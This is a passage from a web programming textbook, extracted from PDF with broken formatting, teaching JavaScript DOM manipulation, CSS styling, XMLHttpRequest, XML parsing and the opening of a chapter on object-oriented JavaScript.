 ) capabilities and a syntax similar to C. JavaScript wasn't 
 intended for large applications, but powerful frameworks (such as jQuery, the 
 Microsoft AJAX Library, prototype, and others) have been developed based on 
 features introduced in newer versions of the language. 
  
 JavaScript is fully supported by the vast majority of web browsers. As JavaScript 
 programs are parsed, their code must arrive unaltered at the client for execution. This 
 is both a strength and a weakness, and you 
 must
  bear it in mind when writing your 
 JavaScript code.
  
 Part of JavaScript's power resides in its ability to manipulate the parent HTML 
 document, and it does this through the DOM interface. The DOM has the ability to 
 manipulate XML-like documents (HTML included) and is supported by a multitude of 
 languages and technologies (JavaScript, Java, PHP, C#, and C++ to name a few). 
  
 In this chapter, we'll delve into using the DOM with both JavaScript and PHP.
  
  
 Feeling a little thin on these two? Don't worry! At the end of this section, 
  
  
 we've included a list of links to go to for more information, tutorials, and 
  
 background on JavaScript and the DOM. Feel free to take them in now, 
  
 before continuing—we'll wait!
  
 On the client side, you will use the DOM and JavaScript in order to:
  
 •
  
 Manipulate the HTML page while you are working on it
  
 •
  
 Read and parse XML documents received from the server
  
 •
  
 Create new XML documents
  
 On the server side, you can use the DOM and PHP in order to:
  
 •
  
 Compose XML documents, usually for sending them to the client 
  
 •
  
 Read XML documents received from various sources
  
 [
  36 
 ]",NA
Time for action – playing with JavaScript and the DOM ,"In keeping with the time-honored beginning example of 
 HelloWorld!
  output, we're 
 going to use the DOM to display a nice 
 Hello, world!
  on the web page (unless you 
 execute it between 10 pm and 5 am, in which case it will nag you with 
 You should go to 
 sleep
 ). We'll start by creating our folders and then creating the necessary files. 
  
  
 All exercises from this book assume that you've installed your machine as 
  
  
 shown in the Appendix. 
  
 1. Create a folder called 
 javascript
  in your 
 ajax
  folder. This folder will 
  
 be used for all the examples in this chapter and the next chapter.
  
 2. In the 
 javascript
  folder, create a subfolder called 
 jsdom
 .
  
 3. In the 
 jsdom
  folder, add a file called 
 jsdom.html
 , with the following 
  
 code in it:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www. 
 w3.org/TR/xhtml11/DTD/xhtml11.dtd"">
  
 <html>
  
  <head>
  
  <title>AJAX Foundations: JavaScript and DOM</title>
  
  <script type=""text/javascript"" src=""jsdom.js""></script>
  
  </head>
  
  <body>
  
  I'm Body.
  
  </body>
  
 </html> 
  
 [
  39 
 ]",NA
What just happened?,"The code is very simple, so it doesn't need a lot of explanation, but here are the main 
 ideas you should know:
  
 •
  
 JavaScript doesn't require you to declare the variables, so in theory you can 
  
 avoid the 
 var
  keywords. This isn't a recommended practice though (it's 
  
 always better to be clear and explicit in your code).
  
 •
  
 The JavaScript script executes automatically when the HTML file is loaded. 
  
 Alternatively, you can group the code into functions and execute them by 
  
 explicitly calling them instead. More on that follows next!
  
  
 spiders (in this example, they won't see 
 Hello World
  or 
 You should go 
  
 to sleep
 . 
 However, they will see 
 I'm Body
 ). If search engine optimization 
  
 is a 
 concern, keep in mind to never output indexable content using only 
  
 JavaScript.
  
  
 Remember! The text generated by your JavaScript code isn't visible to the 
 clients that don't execute JavaScript code, such as search engine 
  
 •
  
 The JavaScript code in 
 jsdom.js
  is executed 
 when the file is referenced, before 
  
 parsing the remaining HTML
 ; in our example, this is in the 
 <head>
  section, 
  
 which explains why 
 Hello World!
  appears before 
 I'm Body
 . One of the 
  
 problems with the example is that you have no control in the JavaScript code 
  
 over where the output should be displayed. Needless to say, this is a bit 
  
 disconcerting and rather awkward.
  
 Except for the most simple of cases, having just JavaScript code that executes 
 unconditionally when the HTML page loads isn't going to work well for you. Usually 
 you'll want to have more control over when, where, and how portions of JavaScript 
 code execute. The most typical scenario uses JavaScript 
 functions
  that execute in 
 response to certain 
 events
  being triggered (such as clicking on a button).",NA
JavaScript events and the DOM,"In the next exercise, we will create an HTML structure from JavaScript code. 
  
 When preparing to build a web page that has dynamically generated parts, 
  
 you first need to create its 
 template
  (which contains the static parts), and use 
 placeholders
  for the dynamic parts. The placeholders must be uniquely identifiable 
 HTML elements (elements with the 
 ID
  attribute set).",NA
Time for action – using JavaScript events and the DOM ,"1. In the 
 ajax/javascript
  folder, create a folder named 
 events
 . 
  
  
 2. In the 
 events
  folder, create a file named 
 events.html
  and type the 
  
  
 following code in it:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.
  
 w3.org/TR/xhtml11/DTD/xhtml11.dtd""> 
  
 <html>
  
  
  <head>
  
  
  <title>AJAX Foundations: JavaScript Events and DOM</title>
  
  <script type=""text/javascript"" src=""events.js""></script>
  
  
 </head>
  
  
  <body onload=""process()"">
  
  
  <p>Hey dude! Here's a cool list of colors for you:</p>
  
  
 <div id=""myDivElement"" />
  
  
  </body> 
  
 </html>
  
 3. Create a new file named 
 events.js
 , and type the following code:
  
 function process() 
  
 {
  
  
  // Create the HTML code
  
  
  var string;
  
  
  string = ""<ul>""
  
  
  + ""<li>Black</li>""
  
  
  + ""<li>Orange</li>""
  
  
  + ""<li>Pink</li>""
  
  
  + ""</ul>"";
  
  
  // obtain a reference to the <div> element on the page
  
  myDiv = document.getElementById(""myDivElement"");
  
  
  // add content to the <div> element
  
  
  myDiv.innerHTML = string; 
  
 }
  
 [
  43 
 ]",NA
What just happened?,"The code is pretty simple. In the HTML code, the important details are highlighted in the 
 following code snippet: 
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.w3.org/ 
 TR/xhtml11/DTD/xhtml11.dtd""> 
  
 <html>
  
  
  <head>
  
  
  <title>AJAX Foundations: JavaScript events and DOM</title>
  
  
  <script type=""text/javascript"" src=""events.js""></script>
  
  
  </head>
  
  
  <body 
 onload=""process()""
 >
  
  
  <p>Hey dude! Here's a cool list of colors for you:</p>
  
  
  <div id=""myDivElement"" />
  
  
  </body> 
  
 </html>
  
 [
  44 
 ]",NA
Even more DOM ,"In the previous exercise, you created the list of elements by joining strings to compose a 
 simple HTML structure. This time, we'll take a look at how to use standards-compliant 
 DOM functions to generate HTML output. The structure that we want to create is similar 
 to that from the previous exercise, except this time, we also generate the list of colors 
 and the paragraph 
 Hey dude…
  dynamically. 
  
 The generated code will look like this:
  
 <div id=""myDivElement"">
  
  
  <p>
  
  
  Hey! Here's a cool list of colors for you:
  
  </p>
  
  
  <ul>
  
  
  <li>Black</li>
  
  
  <li>Orange</li>
  
  
  <li>Pink</li>
  
  
  </ul> 
  
 </div>
  
 Before we begin the next example, there are a few things that we need to briefly cover. A 
 DOM document is a hierarchical structure of elements and each element can have one or 
 more attributes. The 
 document
  object's root node, which you can access, is 
 <body>
 . In the 
 above HTML fragment, the element 
 <div>
  has a single attribute called 
 id
  with the value 
 myDivElement
 . The hierarchical or tree structure of the above code looks like Figure 2-3:
  
 <body>
  
  
 <div>
  
 <p>
  
 Hello dude! Here's a cool list of colors for you
  
 <br>
  
  
 <li>
  
 Black
  
 <ul>
  
 <li>
  
 Orange
  
 <li>
  
 Pink
  
 Figure 2-3: A hierarchy of HTML elements
  
 In the preceding figure, you see an HTML structure formed of 
 <body>
 , 
 <div>
 , 
 <br>
 , 
 <ul>
 , and 
 <li>
  elements, and four text nodes (
 Hello…
 , 
 Black
 , 
 Orange
 , 
 Pink
 ). In the 
 next exercise, you will create this structure using the DOM functions 
 createElement()
 , 
 createTextNode()
 , and 
 appendChild()
 . 
  
 [
  46 
 ]",NA
Time for action – even more DOM ,"1. In the 
 ajax/javascript
  folder, create a folder named 
 jsdom2
 . 
  
 2. In 
 the 
 jsdom2
  folder, create a file named 
 jsdom2.html
  and type the 
  
  
 following code:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.
  
 w3.org/TR/xhtml11/DTD/xhtml11.dtd""> 
  
 <html> 
  
  
  <head>
  
  
  <title>AJAX Foundations: More JavaScript and DOM</title>
  
  
 <script type=""text/javascript"" src=""jsdom2.js""></script>
  
  
 </head>
  
  
  <body onload=""process()"">
  
  
  <div id=""myDivElement"" />
  
  
  </body> 
  
 </html>
  
 3. Create 
 jsdom2.js
  and type the following code:
  
 function process() 
  
 {
  
  
  // create the <p> element
  
  
  oP = document.createElement(""p"");
  
  
  // create the ""Hello..."" text node
  
  
  oHelloText = document.createTextNode
  
  
  (""Hey dude! Here's a cool list of colors for you:"");
  
  // add the text node as a child element of <p>
  
  
  oP.appendChild(oHelloText);
  
  // create the <ul> element
  
  oUl = 
 document.createElement(""ul"")
  
  // create the first <ui> element and add a text node to 
 it oLiBlack = document.createElement(""li"");
  
  oBlack = document.createTextNode(""Black"");
  
  oLiBlack.appendChild(oBlack);
  
  // create the second <ui> element and add a text node to it 
 oLiOrange = document.createElement(""li"");
  
  oOrange = document.createTextNode(""Orange"");
  
  oLiOrange.appendChild(oOrange);
  
  // create the third <ui> element and add a text node to 
 it oLiPink = document.createElement(""li"");
  
  oPink = document.createTextNode(""Pink"");
  
 [
  47 
 ]",NA
What just happened?,"Although there are many lines of code, the functionality is pretty simple and it follows a 
 clean coding practice that, at least in theory, generates code that is easier to maintain in 
 the long run. This suggests clearly enough that using the DOM to create HTML structures 
 may not always be the best option. However, in complex projects, it can actually make 
 life easier; here's why:
  
 •
  
 It's fairly easy to use DOM to programmatically create dynamic HTML 
 structures, such as building elements in 
 for
  loops, because you're not 
 concerned about text formatting but about building the structural elements. You 
 don't need, for example, to manually add closing tags. When you add a 
 <ui>
  
 element, the DOM will generate the 
 <ui>
  tag and the associated closing 
 </ui>
  
 tag for you.
  
 [
  48 
 ]",NA
"JavaScript, DOM, and CSS","As you most likely know, CSS is a powerful language used to describe the appearance 
 of the elements of a web page. CSS definitions can be stored in one or more files with 
 the 
 .css
  extension, allowing web designers to separate styling definitions from 
 HTML document structure. If the job is done right, and done consistently in a 
 website, CSS is a powerful tool allowing you to make minor or sweeping visual 
 changes to an entire site with very little time or effort, just by editing the CSS file. 
  
 While 
 technically
  it's not necessary to know CSS when implementing 
  
 AJAX, in practice it's very desirable to be at least educated in CSS basics, 
  
 even if the HTML and CSS design is created by someone else. CSS is a vast subject; 
 there are many books and tutorials on CSS, including those you can find at 
 http://www.w3.org/Style/CSS/learning
  and 
 http://www.csstutorial.net/
 .
  
 We will do a simple exercise to demonstrate CSS techniques, and manipulating styles 
 using JavaScript and the DOM. In the following exercise, you will draw a nifty little table 
 and two buttons, 
 Set Style 1
  and 
 Set Style 2
 , that will change the table's appearance by 
 switching the current style. See Figure 2-5 to get a feel of what you're about to create.",NA
Time for action – working with CSS and JavaScript,"1. In the 
 javascript
  folder, create a new subfolder called 
 css
 .
  
 2. In your newly created 
 csstest
  folder, create a new file called 
  
 cssdemo.html
 with the following contents:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www. 
 w3.org/TR/xhtml11/DTD/xhtml11.dtd"">
  
 <html>
  
  <head>
  
  <title>AJAX Foundations: JavaScript and CSS Demo</title>
  
  <script type=""text/javascript"" src=""cssdemo.js""></script>
  
  <link href=""cssdemo.css"" type=""text/css"" rel=""stylesheet""/> 
  
  </head>
  
  <body>
  
  <table id=""table"">
  
  <tr>
  
  <th id=""tableHead"">
  
  Product Name
  
  </th>
  
  </tr>
  
  <tr>
  
 [
  50 
 ]",NA
What just happened?,"Your 
 cssdemo.css
  file contains two sets of styles that can be applied to the table in 
 cssdemo.html
 . When the user clicks one of the 
 SetStyle
  buttons (an event that calls 
 the appropriate 
 setStyle()
  function), the JavaScript DOM is used to assign those 
 styles to the elements of the table. (Take a quick look at the HTML page so you are 
 familiar with where these styles are implemented.)
  
 In the first part of the 
 setStyle()
  methods, we use the 
 getElementById()
  function to 
 obtain references to the HTML elements that we want to apply CSS styles to:
  
  // obtain references to HTML elements
  
  oTable = document.getElementById(""table"");
  
  oTableHead = document.getElementById(""tableHead"");
  
  oTableFirstLine = document.getElementById(""tableFirstLine"");
  
  oTableSecondLine = document.getElementById(""tableSecondLine"");
  
 [
  53 
 ]",NA
Using the XMLHttpRequest object,"XMLHttpRequest
  is the object that enables JavaScript to make asynchronous HTTP 
 requests to the server and  receive responses from it, and then update parts of the page 
 completely in the background. Combine 
 XMLHttpRequest
 , CSS, and DOM and you have 
 all the ingredients for that responsive, visually appealing, and ""smart"" site we keep 
 telling you about—without visually interrupting the user. AJAX!
  
 The 
 XMLHttpRequest
  object was initially implemented by Microsoft in 1999 as an 
 ActiveX object in Internet Explorer, and eventually became the 
 de facto
  standard for all 
 the browsers, being supported as a native object by all modern web browsers. 
  
 The typical sequence of operations when working with 
 XMLHttpRequest
  is as 
 follows:
  
 1. Create an instance of the 
 XMLHttpRequest
  object.
  
 2. Use the 
 XMLHttpRequest
  object to make an asynchronous call to a server page and 
 define a callback function that will be executed automatically when the server 
 response is received.
  
 3. Evaluate the server's response in the callback function.
  
 4. Carry out updating of the web page with the data received.
  
 5. Return to step 2.
  
 [
  54 
 ]",NA
Creating the XMLHttpRequest object ,"The 
 XMLHttpRequest
  is implemented in different ways by browsers. In Internet 
 Explorer 6 and older, 
 XMLHttpRequest
  is implemented as an ActiveX control, and you 
 instantiate it like this:
  
 xmlhttp = new ActiveXObject(""Microsoft.XMLHttp"");
  
 For the other web browsers, including Google Chrome, Firefox, Opera, Safari, and 
 Internet Explorer 7 and 8, 
 XMLHttpRequest
  is a native object, so you create instances of 
 it like this:
  
 xmlhttp = new XMLHttpRequest();
  
 A simplified version of the code we will use for cross-browser 
 XMLHttpRequest 
 instantiation throughout this book is the following(we've highlighted the relevant 
 pieces of code for you.):
  
 // creates an XMLHttpRequest instance 
  
 function createXmlHttpRequestObject() 
  
 {
  
  
  // will store the reference to the XMLHttpRequest 
 object
  
  var xmlHttp;
  
  
  // create the XMLHttpRequest object
  
  
  try
  
  
  {
  
  
  // assume IE7 or newer or other modern browsers
  
  
  xmlHttp = new XMLHttpRequest();
  
  
  }
  
  
  catch(e)
  
  
  {
  
  
  // assume IE6 or older
  
  
  try
  
  
  {
  
    
  xmlHttp = new ActiveXObject(""Microsoft.XMLHttp"");
  
  
 }
  
  
  catch(e) { }
  
  
  }
  
  
  // return the created object or display an error 
 message
  
  if (!xmlHttp)
  
  
  alert(""Error creating the XMLHttpRequest object."");
  
  
 else 
  
 [
  55 
 ]",NA
JavaScript exception handling,"The 
 try
 /
 catch
  construct, initially implemented with OOP languages, offers a powerful 
 exception-handling technique in JavaScript. Basically, when an error happens in 
 JavaScript code, an exception is thrown. The exception has the form of an object that 
 contains the error's (exception's) details. By using the 
 try
 /
 catch 
 syntax, you can 
 catch
  the exception and handle it locally, so that the error won't be propagated to the 
 user's browser. 
  
 The 
 try
 /
 catch
  syntax is as follows:
  
 try 
  
 { 
  
  
  // code that might generate an exception 
  
 } 
  
 catch (e) 
  
 { 
  
  
  // code that is executed only if an exception was thrown by the try 
 block 
  
  
  // (exception details are available through the e parameter) 
  
 }
  
 You place any code that might generate errors inside the 
 try
  block. If it gives an 
 error , the execution is passed immediately to the 
 catch
  block. If there's no error 
 inside the 
 try
  block, then the code in the 
 catch
  block never executes.
  
 Runtime exceptions propagate from the point they were raised, up through the call stack 
 of your program. If you don't handle the exception locally, it will end up getting caught by 
 the web browser, which may display a not very good-looking error message to your 
 visitor.
  
 The way you respond to each exception depends very much on the situation at hand. 
 Sometimes you will simply ignore the error, other times you will flag it somehow in the 
 code, or you will display an error message to your visitor. Rest assured that in this book 
 you will meet all kinds of scenarios.
  
 [
  56 
 ]",NA
Creating better objects for Internet Explorer 6 ,"The one thing that can be improved about the 
 createXmlHttpRequestObject 
 function is to have it recognize the latest version of the ActiveX control, in case the 
 browser is Internet Explorer 6. In most cases, you can rely on the basic functionality 
 provided by 
 ActiveXObject(""Microsoft.XMLHttp"")
 , but if you want to try using a 
 more recent version, you can.
  
 The typical solution is to try creating the latest known version, and if it fails, ignore the 
 error and retry with an older version, and so on until you get an object instead of an 
 exception. The latest 
 prog ID
  of the 
 XMLHTTP
  ActiveX Object is 
 MSXML2.
  
 XMLHTTP.6.0
 . For more details about these prog IDs, or to simply get a better 
 idea of the chaos that lies behind them, feel free to read a resource such as 
 http://puna.net.nz/etc/xml/msxml.htm
 .
  
 Here is the upgraded version of 
 createXmlHttpRequestObject
 . The new bits 
 are highlighted:
  
 // creates an XMLHttpRequest instance 
  
 function createXmlHttpRequestObject() 
  
 {
  
  
  // will store the reference to the XMLHttpRequest object
  
  
 var xmlHttp;
  
  
  // create the XMLHttpRequest object
  
  
  try
  
  
  {
  
  
  // assume IE7 or newer or other modern browsers
  
  
  xmlHttp = new XMLHttpRequest();
  
  
  }
  
  
  catch(e)
  
  
  {
  
  
  // assume IE6 or older
  
  
  var XmlHttpVersions = new Array('MSXML2.XMLHTTP.6.0',
  
      
  'MSXML2.XMLHTTP.5.0',
  
      
  'MSXML2.XMLHTTP.4.0',
  
      
  'MSXML2.XMLHTTP.3.0',
  
      
  'MSXML2.XMLHTTP',
  
      
  'Microsoft.XMLHTTP');
  
  
  // try every prog id until one works
  
  
  for (var i=0; i<XmlHttpVersions.length && !xmlHttp; i++) 
  
  
 {
  
    
  try 
  
    
  { 
  
     
  // try to create XMLHttpRequest object
  
     
  xmlHttp = new ActiveXObject(XmlHttpVersions[i]);      } 
  
 [
  59 
 ]",NA
Initiating server requests using ,NA,NA
XMLHttpRequest ,"After creating the 
 XMLHttpRequest
  object, you can do loads of interesting things 
 with it. You will learn the most interesting details about 
 XMLHttpRequest
  by 
 practice, but for a quick reference here are the object's methods and properties:
  
 Method/Property
  
 Description
  
 abort()
  
 Stops the current request.
  
  
 getAllResponseHeaders() 
  
 getResponseHeader(""headerLabel"") 
 open(""method"", ""URL""[, 
  
 asyncFlag[, ""userName""[, 
  
 ""password""]]]) 
  
 send(content) 
  
 setRequestHeader(""label"", 
  
 ""value"")
  
 onreadystatechange
  
 Returns the response headers as a string. 
 Returns a single response header as a string. 
 Initializes the request parameters. 
  
 Performs the HTTP request.
  
 Sets a label/value pair to the request header. 
 Used to set the callback function that handles 
 request state changes.
  
 [
  60 
 ]",NA
Handling server response ,"The 
 handleRequestStateChange()
  method is the callback method that we set to 
 handle the request state of the request changes (due to server responses). In practice, 
 we're interested in the state that indicates the server response has been fully received.
  
 Usually, 
 handleRequestChange()
  is called four times, once for every time the 
 request enters a new state. The state of the request, returned by the 
 readyState 
 property, can be any of the following:
  
 0 = uninitialized 
  
 1 = loading 
  
 2 = loaded 
  
 3 = interactive 
  
 4 = complete
  
 Except for state 
 3
 , these are rather self-explanatory terms. The 
 interactive
  state is 
 an intermediate state when the response has been partially received. In our AJAX 
 applications, we will only use the 
 complete
  state, which marks that a response has 
 been received from the server.
  
 The typical implementation of 
 handleRequestStateChange()
  is shown in the 
 following code snippet, which highlights the portion where you actually read the 
 response from the server. Here too we can successfully use 
 try
 /
 catch
  to handle errors 
 that could happen when initiating a connection to the server, or when reading the 
 response from the server. Before attempting to read the received data, we also verify 
 that the response status code is 200. Sending such a code indicating the status of the 
 request is part of the HTTP protocol, and 200 is the status code that specifies that the 
 request completed successfully:
  
 // function executed when the state of the request 
 changes function handleRequestStateChange() 
  
 {
  
  
  // continue if the process is completed
  
  
  if (xmlHttp.readyState == 4) 
  
  
  {
  
  
  // continue only if HTTP status is ""OK""
  
  
  if (xmlHttp.status == 200) 
  
  
  {
  
    
  try
  
    
  {
  
     
  // retrieve the response
  
     
  response = xmlHttp.responseText;
  
     
  // do something with the response
  
     
  // ...
  
 [
  63 
 ]",NA
Time for action – making asynchronous calls with ,NA,NA
XMLHttpRequest ,"1. In the 
 javascript
  folder, create a subfolder named 
 xmlhttprequest
 . 
  
 2. In the 
 xmlhttprequest
  folder, create a file called 
 async.txt
 , and add 
  
  
 the following text to it:
  
 Hello, client!
  
 3. In the same folder create a file called 
 async.html
 , and add the following 
  
 code 
 to it:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.
  
 w3.org/TR/xhtml11/DTD/xhtml11.dtd""> 
  
 <html>
  
  
  <head>
  
  
  <title>AJAX Foundations: Using XMLHttpRequest</title>
  
  
 <script type=""text/javascript"" src=""async.js""></script>
  
  
 </head>
  
  
  <body onload=""process()"">
  
  
  <p>Hello, server!</p>
  
  
  <div id=""myDivElement"" />
  
  
  </body> 
  
 </html>
  
 4. In the same folder create a file called 
 async.js
  with the following contents:
  
 // holds an instance of XMLHttpRequest 
  
 var xmlHttp = createXmlHttpRequestObject();
  
 // creates an XMLHttpRequest instance 
  
 function createXmlHttpRequestObject() 
  
 {
  
  
  // will store the reference to the XMLHttpRequest object
  
  var xmlHttp;
  
  
  // create the XMLHttpRequest object
  
  
  try
  
  
  {
  
  
  // assume IE7 or newer or other modern browsers
  
  
  xmlHttp = new XMLHttpRequest();
  
  
  }
  
  
  catch(e)
  
  
  {
  
  
  // assume IE6 or older
  
 [
  65 
 ]",NA
What just happened?,"To understand the exact flow of execution, let's start from where the processing 
 begins—the 
 async.html
  file:
  
 <html>
  
  
  <head>
  
  
  <title>AJAX Foundations: Using XMLHttpRequest</title>
  
  
 <script type=""text/javascript"" 
 src=""async.js""
 ></script>
  
  
 </head>
  
  
  <body 
 onload=""process()""
 >
  
 This bit of code hides some interesting functionality. First, it references the 
 async.js 
 file, and the code in that file is parsed. Remember that the code residing in JavaScript 
 functions does not execute automatically, but the rest of the code does. All the code in our 
 JavaScript file is packaged as functions, except one line:
  
 // holds an instance of XMLHttpRequest 
  
 var xmlHttp = createXmlHttpRequestObject();
  
 This way, we ensure that the 
 xmlHttp
  variable contains an 
 XMLHttpRequest 
 instance right from the start. The 
 XMLHttpRequest
  instance is created by calling the 
 createXmlHttpRequestObject()
  function that you encountered a bit earlier.
  
 The 
 process()
  method gets executed when the 
 onload
  event fires. To guard against 
 potential problems, the 
 process()
  method first checks to be sure the 
 xmlHttp
  object 
 has been initialized. If we have a valid 
 xmlHttp
  object, we use it to asynchronously read 
 asynx.txt
  from the server. While waiting for the response, we change the cursor to the 
 ""busy"" icon:
  
 // performs a server request and assigns a callback function 
 function process() 
  
 {
  
  
  // only continue if we have a valid xmlHttp object
  
  
  if (xmlHttp)
  
  
  {
  
  
  // try to connect to the server
  
  
  try
  
  
  {
  
    
  // initiate reading the async.txt file from the server
    
  xmlHttp.open(""GET"", ""async.txt"", true);
  
    
  xmlHttp.onreadystatechange = handleRequestStateChange;
    
  xmlHttp.send(null);
  
    
  // change cursor to ""busy"" hourglass icon
  
    
  document.body.style.cursor = ""wait"";    
  
  
  }
  
 [
  69 
 ]",NA
Working with XML structures ,"XML documents are similar to HTML documents in that they are text-based, and 
 contain hierarchies of elements. You can use the DOM to manipulate XML files just as 
 you did for manipulating HTML files.
  
 XML is one of the two popular data exchange formats used in AJAX applications (the other 
 format is JSON and we'll talk about it in Chapter 3, 
 Object Oriented JavaScript
 ). It's 
 important to understand that using XML in AJAX applications is optional (even though 
 XML puts the X in AJAX and the prefix in 
 XMLHttpRequest
 ). In the previous exercise, you 
 created a simple application that made an asynchronous call to the server, just to receive 
 a text document; no XML was involved.
  
 [
  71 
 ]",NA
Time for action – making asynchronous calls with ,NA,NA
XMLHttpRequest and XML ,"1. Under the 
 javascript
  folder, create a subfolder called 
 xml
 .
  
 2. In the 
 xml
  folder, create a file called 
 books.xml
 , which will contain the XML 
 structure that we will read using JavaScript's DOM. Add the following content to 
 the file:
  
 <?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?> 
 <response>
  
  
  <books>
  
  
  <book>
  
    
  <title>
  
     
  AJAX and PHP: Building Modern Web Applications,  
     
  2nd Edition
  
    
  </title>
  
    
  <isbn>
  
     
  978-1904817726
  
    
  </isbn>
  
  
  </book>
  
  
  <book>
  
    
  <title>
  
     
  Beginning PHP and MySQL E-Commerce, 2nd Edition
    
  </title>
  
    
  <isbn>
  
     
  978-1590598641
  
    
  </isbn>
  
  
  </book>
  
  
  <book>
  
    
  <title>
  
     
  Professional Search Engine Optimization with PHP
    
  </title>
  
    
  <isbn>
  
     
  978-0470100929
  
    
  </isbn>
  
  
  </book>
  
  
  </books> 
  
 </response>
  
 [
  72 
 ]",NA
What just happened?,"Most of the code will already start looking familiar, as it builds the basic framework we 
 have built so far. The novelty consists in the 
 handleServerResponse()
  function, which 
 is called from 
 handleRequestStateChange()
  when the request is complete.
  
 The 
 handleServerResponse()
  function starts by retrieving the server response in 
 XML format:
  
 // handles the response received from the server
  
 function handleServerResponse()
  
 {
  
  // read the message from the server
  
  var xmlResponse = xmlHttp.responseXML;
  
 The 
 responseXML
  property of the 
 XMLHttpRequest
  object wraps the received response 
 as a DOM document. If the response isn't a valid XML document, the browser might throw 
 an error. However, this depends on the specific browser you're using, because each 
 JavaScript and DOM implementation behaves in its own way.
  
 [
  76 
 ]",NA
Handling more errors and throwing ,NA,NA
exceptions,"As highlighted earlier, if the XML document you're trying to read is not valid, each 
 browser will react in its own way. We have made a simple test by removing the closing 
 </response>
  tag from 
 books.xml
 . Firefox will throw an error to the 
 ErrorConsole 
 (see 
 Figure 2-9), but besides that, no error will be shown to the user. This is not good, of 
 course, because not many users browse websites looking at the 
 ErrorConsole
 . 
  
 Open the Firefox JavaScript console from 
 Tools | Error Console
 . (Please see Chapter 6, 
 Debugging and Profiling AJAX Applications
 , for more details about the JavaScript Console 
 and other excellent tools that help with debugging.)
  
  
 Figure 2-9: The Firefox JavaScript Console is Very Useful
  
 Opera, Internet Explorer, Chrome, and Safari are friendlier. They do catch 
  
 the error using the 
 try
 /
 catch
  blocks. Opera offers the most detailed error message 
 (Figure 2-10 shows the standard one; it can be configured to be much more verbose), 
 but you can customize the message you display to your visitor.
  
  
 Figure 2-10: Opera displaying an error message
  
 [
  78 
 ]",NA
Creating XML structures ,"XML and DOM are everywhere. In this chapter, you used the DOM to create HTML 
 elements on the existing DOM object called 
 document
 , and you also learned how to read 
 XML documents received from the server. An important detail that we didn't cover was 
 creating brand new XML documents using JavaScript's DOM. You may need to perform 
 this kind of functionality if you want to create XML documents on the client, and send 
 them for reading on the server.
  
 We won't go through more examples, but we will show you the missing bits. The trick 
 with creating a brand new XML document is creating the XML document itself. When 
 adding elements to the HTML output, you used the implicit 
 document
  object, but this is 
 not an option when you need to create a new document.
  
 When creating a new DOM object with JavaScript, we're facing the same problem as with 
 creating 
 XMLHttpRequest
  objects: the method of creating the object depends on the 
 browser. The following function is a universal function that returns a new instance of a 
 DOM object:
  
 function createDomObject() 
  
 {
  
  
  // will store reference to the DOM object 
  
  
  var xmlDoc;
  
  
  // create XML document
  
  
  if (document.implementation && document.implementation.
  
 createDocument)
  
  
  {
  
  
  xmlDoc = document.implementation.createDocument("""", """", null);
  
  }
  
  
  // works for Internet Explorer
  
  
  else if (window.ActiveXObject)
  
  
  {
  
  
  xmlDoc = new ActiveXObject(""Microsoft.XMLDOM"");
  
  
  }
  
  
  // returns the created object or displays an error message
  
  
 if (!xmlDoc)
  
  
  alert(""Error creating the DOM object."");
  
  
  else 
  
  
  return xmlDoc;
  
 }
  
 [
  79 
 ]",NA
Summary,"This chapter walked you through many fields. Working with HTML, JavaScript, CSS, the 
 DOM, XML, and 
 XMLHttpRequest
  is certainly not easy to start with, especially if some of 
 these technologies are new to you. Where you don't feel confident enough, have a look at 
 the aforementioned resources. When you feel ready, proceed to Chapter 3, 
 Object Oriented 
 JavaScript
 , where you will learn about object-oriented programming and JavaScript. 
  
 [
  80 
 ]",NA
Object Oriented JavaScript,"Most programmers assume that by having some prior knowledge of a programming 
 language such as C++, Java, C#, or PHP, they can easily add JavaScript to their résumé. 
 Additionally, if they have used it on a couple of projects, they tend to rate themselves 
 rather highly at it as well.
  
 In reality, JavaScript is a complex and unique programming language, but because its 
 learning curve is very sharp and we can do a lot of stuff with it very quickly, we tend to 
 use it superficially—if it gets the job done, why look further?
  
 In this chapter, you'll learn that, internally, JavaScript is fundamentally different from 
 ""traditional"" OOP languages, and that it gives you great power and flexibility in 
 implementing fascinating features. You'll learn:
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 Basic OOP concepts—encapsulation, polymorphism, and inheritance How 
 to work with JavaScript objects, functions, classes, and prototypes How to 
 simulate private, instance, and static class members in JavaScript What the 
 JavaScript execution context is 
  
 How to implement inheritance by using constructor functions and 
 prototyping 
  
 JSON basics
  
 Let's get started then!",NA
Why is OOP in JavaScript important?,"In 2000, JavaScript frameworks were nearly non-existent and the term AJAX was yet to 
 be coined. The 
 ObjectOriented
  (
 OO
 ) features of JavaScript slipped under the radar 
 and went grossly underexploited. Over the years, web technologies have matured and 
 flourished such that previously hidden gems, such as JavaScript and other 
 Object 
 Oriented Programming
  (
 OOP
 ) languages, have come to the fore. 
  
 Today, frameworks are very common and rely heavily on features such as OOP. Armed 
 with the OO features of JavaScript, we have rather impressive frameworks of more 
 than 10,000 lines of code. And we add another layer that extends core functionality by 
 using core frameworks like script.aculo.us, jQuery, and the 
 Yahoo! 
  
 User Interface Library
  (
 YUI
 ) to name a few. There are an impressive number of 
 powerful, flexible, and easy-to-use JavaScript frameworks at our disposal but without a 
 firm grasp on OOP techniques (and the particularities of JavaScript OO) it's difficult to 
 fully exploit them.
  
 Knowing where to start with OOP and OO features is really important. The material in the 
 following chapters relies on these concepts, so here is the right place to tackle the features 
 of OO that will be used throughout the book. To be sure we're all on the same page, we'll 
 briefly review the essential OOP concepts—objects, classes, encapsulation, and 
 inheritance and then ""port"" this knowledge into the realm of JavaScript.",NA
Object-oriented programming concepts,"What does 
 object-oriented programming
  mean anyway? Basically, as the name 
 suggests, OOP puts objects at the center of the programming model. The 
 object 
 is 
 probably the most important concept in the world of OOP—a self-contained entity 
 that has 
 state
  and 
 behavior
 , just like a real-world object. An object is an instance of 
 a 
 class
  (also called 
 type
 ). A 
 class
  defines the behavior that is shared by instances of 
